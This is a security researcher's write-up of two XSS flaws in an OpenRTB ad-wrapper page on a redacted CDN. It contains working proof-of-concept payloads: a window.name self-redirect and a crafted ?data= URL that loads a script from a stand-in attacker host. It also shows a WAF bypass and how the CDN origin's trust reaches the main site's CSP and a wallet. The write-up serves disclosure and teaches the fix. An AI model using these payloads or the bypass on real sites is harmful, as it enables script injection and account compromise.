# From `window.name` to a WAF Bypass: Two XSS in an OpenRTB Ad Wrapper

<img width="580" height="714" alt="image" src="https://github.com/user-attachments/assets/cc68f7eb-a447-4bcc-a20c-a22d9556791e" />



> One unvalidated `<script src>`, two independent input sources, and a CDN that the whole site's trust was built on. Less about the bug, more about the *why* behind the exploit choices.

*(Program and domains are redacted: CDN = `cdn-target.com`, main site = `target.com`, wallet = `wallet.target.com`.)*

## TL;DR

A file `openrtb-wrapper.html` on the CDN reads OpenRTB native-ad data from user-controlled input and, for every event tracker with `method: 2`, injects its `url` **verbatim** into a `<script src>`. Result: arbitrary JS in the CDN's own origin. The same sink is reachable from **two separate sources** — `window.name` and a `?data=` query param — each with a different patch and a different delivery.

## Why the sink exists

In OpenRTB Native, each tracker has a `method`: `1` = Image (pixel), `2` = JS (loaded as `<script>`). So the wrapper is "spec-correct" in building a `<script>` for JS trackers — but both *whether* to build it and *what URL* to load come from the attacker. **When the data model lets input pick the behavior (img vs script), the data model itself is the sink.**

## Vulnerable code

```js
// Source selection (verbatim): window.name first, else ?data=
t = (window.name != null && window.name.length)
      ? parse(window.name).data                                     // Finding #1
      : parse(new URLSearchParams(location.search).get("data")||"{}"); // Finding #2

// Sink (reconstructed): method 2 → <script src = attacker url>
if (config.track3PEnable) for (const tr of content.eventTrackers)
  if (tr.method === 2) {
    const s = document.createElement('script');
    s.src = tr.url;                 // ← unvalidated, attacker-controlled
    document.head.appendChild(s);   // ← executes in the CDN origin
  }
```

No allowlist, no scheme check. Whatever is in `tr.url` runs as a script in the CDN origin.

## Finding #1 — source `window.name` (and why iframe was dropped)

`window.name` persists across navigations and is readable cross-origin by whatever document occupies the context. Set it before the target loads → you control the input.

**iframe (the obvious try):** truly zero-click, but **dies to `X-Frame-Options` / `frame-ancestors`** — if the target blocks framing, the frame never loads. That's where it failed.

**The fix: `window.name` isn't tied to a frame.** Set your own window's name and redirect — no framing, still zero-click:

```html
<!-- PoC #1 (used): self-redirect, bypasses framing, zero-click, self-contained data: URI -->
<script>
var jsPayload = "alert(origin);//a.js";
var payload = { data: { id:"poc", config:{ track3PEnable:true },
  content:{ assets:{}, eventTrackers:[
    { event:502, method:2, url:"data:text/javascript,"+encodeURIComponent(jsPayload) }
  ]}}};
window.name = JSON.stringify(payload);
window.location = "https://cdn-target.com/.../openrtb-wrapper.html";
</script>
```

Victim clicks the attacker link → redirected to the CDN → `alert(origin)` fires with no further interaction. (`window.open(url, name)` is the same primitive when you need the attacker page to stay open — costs one gesture due to the popup blocker.)

> **Lesson:** iframe only gives zero-click if the target allows framing. `window.name = payload; location = target` keeps zero-click *and* sidesteps framing entirely.

## Finding #2 — same sink via `?data=` + WAF bypass

That `? :` means the sink is also reachable from a query param — a **single clickable URL**, no attacker JS, no iframe, no hosting:

```
# PoC #2 (used)
https://cdn-target.com/.../openrtb-wrapper.html?data=%7B%22id%22%3A%22poc%22%2C%22config%22%3A%7B%22track3PEnable%22%3Atrue%7D%2C%22content%22%3A%7B%22assets%22%3A%7B%7D%2C%22eventTrackers%22%3A%5B%7B%22event%22%3A1%2C%22method%22%3A2%2C%22url%22%3A%22https%3A%2F%2Fattacker-host.example%2Fx.js%22%7D%5D%7D%7D
```

Decoded `data`:

```json
{"id":"poc","config":{"track3PEnable":true},"content":{"assets":{},"eventTrackers":[{"event":1,"method":2,"url":"https://attacker-host.example/x.js"}]}}
```

```js
// x.js — never seen by the WAF because it's not in the request URL
alert('XSS on: ' + origin);
```

**WAF bypass:** the WAF blocked `alert(`, `eval(`, `javascript`, `data:text/javascript`, `new Function(` in the raw URL. By moving the payload into an external file, the request URL only holds a benign script URL. **A blocklist WAF matches the request string; the sink is a `<script src>` — outsource execution to an external file and there's nothing to match.**

**Not a duplicate:** different source, different patch (`window.name` vs `?data=`), different delivery. Patching one leaves the other open.

## Why CDN-origin XSS hits harder

`*.cdn-target.com` was in `target.com`'s CSP `script-src` allowlist, and hardcoded as a trusted `postMessage` origin in `wallet.target.com`'s handler. Code exec here = bypassing the main site's CSP + forging wallet messages that the origin check accepts. **Rate severity by who trusts the origin, not by where the alert fired.**

## Fix

- Don't build `<script>` from input — fire trackers via `fetch()` / `sendBeacon()`.
- If you must load a script, allowlist scheme + host hard (`https:` only, no `data:`).
- Sanitize both sources at one entry point so one patch doesn't leave the other reachable.
- Treat the WAF as a second layer, not the fix — a redirect to an external file defeats token blocklists.
